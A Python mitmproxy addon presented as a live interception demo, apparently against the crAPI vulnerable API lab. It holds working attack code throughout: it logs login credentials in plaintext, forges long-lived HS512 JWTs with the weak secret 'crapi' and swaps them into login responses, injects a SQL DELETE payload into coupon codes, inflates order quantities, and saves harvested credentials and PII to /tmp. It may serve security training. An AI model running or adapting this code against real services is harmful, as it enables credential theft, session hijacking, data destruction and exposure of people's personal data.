"""
Live demonstration of request interception and modification
This addon will:
1. Intercept login requests and log credentials
2. Modify the JWT in responses to inject a forged one
3. Auto-inject SQL payloads in vulnerable parameters
4. Detect and log PII in responses

Usage:
    mitmdump -p 8082 -s live_intercept.py
"""

import mitmproxy.http
from mitmproxy import ctx
import json
import hmac
import hashlib
import base64
import time


class LiveInterceptDemo:
    def __init__(self):
        self.jwt_secret = "crapi"  # Known weak secret (for demo)
        self.captured_credentials = []
        self.pii_detected = []

    def base64url_encode(self, data):
        if isinstance(data, str):
            data = data.encode("utf-8")
        return base64.urlsafe_b64encode(data).rstrip(b"=").decode("utf-8")

    def forge_jwt(self, email):
        """Forge a JWT token with the weak secret"""
        header = {"alg": "HS512"}
        header_b64 = self.base64url_encode(json.dumps(header, separators=(",", ":")))

        payload = {
            "sub": email,
            "iat": int(time.time()),
            "exp": int(time.time()) + 86400 * 365,  # 1 year token!
        }
        payload_b64 = self.base64url_encode(json.dumps(payload, separators=(",", ":")))

        header_payload = f"{header_b64}.{payload_b64}"
        signature = hmac.new(
            self.jwt_secret.encode(), header_payload.encode(), hashlib.sha512
        ).digest()
        return f"{header_payload}.{self.base64url_encode(signature)}"

    def request(self, flow: mitmproxy.http.HTTPFlow):
        url = flow.request.pretty_url

        # Intercept login requests - log credentials
        if "/api/auth/login" in url and flow.request.method == "POST":
            try:
                body = json.loads(flow.request.content)
                email = body.get("email", "unknown")
                password = body.get("password", "unknown")

                self.captured_credentials.append(
                    {
                        "time": time.strftime("%Y-%m-%d %H:%M:%S"),
                        "email": email,
                        "password": password,
                    }
                )

                ctx.log.warn(
                    f"[CREDENTIAL CAPTURE] Email: {email} | Password: {password}"
                )

                # Store email for response modification
                flow.metadata["captured_email"] = email
            except:
                pass

        # Intercept and modify coupon requests - auto-inject SQL
        if "/api/shop/apply_coupon" in url:
            try:
                body = json.loads(flow.request.content)
                if "coupon_code" in body:
                    original = body["coupon_code"]
                    # Inject SQL to delete tracking record
                    body["coupon_code"] = (
                        f"{original}';DELETE FROM applied_coupon WHERE coupon_code='{original}';--"
                    )
                    flow.request.content = json.dumps(body).encode()
                    ctx.log.warn(
                        f"[SQL INJECTION] Modified coupon_code with DELETE payload"
                    )
            except:
                pass

        # Intercept order requests - escalate quantity
        if "/api/shop/orders" in url and flow.request.method == "POST":
            try:
                body = json.loads(flow.request.content)
                if "quantity" in body:
                    original = body["quantity"]
                    body["quantity"] = 9999
                    flow.request.content = json.dumps(body).encode()
                    ctx.log.warn(
                        f"[QUANTITY ESCALATION] Modified quantity from {original} to 9999"
                    )
            except:
                pass

    def response(self, flow: mitmproxy.http.HTTPFlow):
        url = flow.request.pretty_url

        # Modify login response - replace token with long-lived forged one
        if "/api/auth/login" in url and flow.response.status_code == 200:
            try:
                body = json.loads(flow.response.content)
                if "token" in body:
                    email = flow.metadata.get("captured_email", "user@example.com")

                    # Replace with our forged long-lived token
                    original_token = body["token"]
                    forged_token = self.forge_jwt(email)
                    body["token"] = forged_token

                    flow.response.content = json.dumps(body).encode()
                    ctx.log.warn(
                        f"[TOKEN REPLACEMENT] Replaced JWT with 1-year forged token"
                    )
                    ctx.log.info(f"  Original: {original_token[:50]}...")
                    ctx.log.info(f"  Forged:   {forged_token[:50]}...")
            except:
                pass

        # Log sensitive data in responses
        if "/api/v2/user/dashboard" in url:
            try:
                body = json.loads(flow.response.content)
                pii = {
                    "name": body.get("name"),
                    "email": body.get("email"),
                    "phone": body.get("number"),
                    "credit": body.get("available_credit"),
                }
                self.pii_detected.append(pii)
                ctx.log.warn(
                    f"[PII DETECTED] User: {pii['name']} | Email: {pii['email']} | Credit: ${pii['credit']}"
                )
            except:
                pass

        # Detect and log vehicle information
        if "/api/v2/vehicle" in url:
            try:
                body = flow.response.content.decode("utf-8", errors="ignore")
                if "vin" in body.lower() or "pincode" in body.lower():
                    ctx.log.warn(
                        f"[VEHICLE DATA] Sensitive vehicle information detected in response"
                    )
            except:
                pass

    def done(self):
        """Save captured data on exit"""
        if self.captured_credentials:
            with open("/tmp/captured_credentials.json", "w") as f:
                json.dump(self.captured_credentials, f, indent=2)
            ctx.log.info(
                f"[SAVED] {len(self.captured_credentials)} credentials to /tmp/captured_credentials.json"
            )

        if self.pii_detected:
            with open("/tmp/detected_pii.json", "w") as f:
                json.dump(self.pii_detected, f, indent=2)
            ctx.log.info(
                f"[SAVED] {len(self.pii_detected)} PII records to /tmp/detected_pii.json"
            )


addons = [LiveInterceptDemo()]
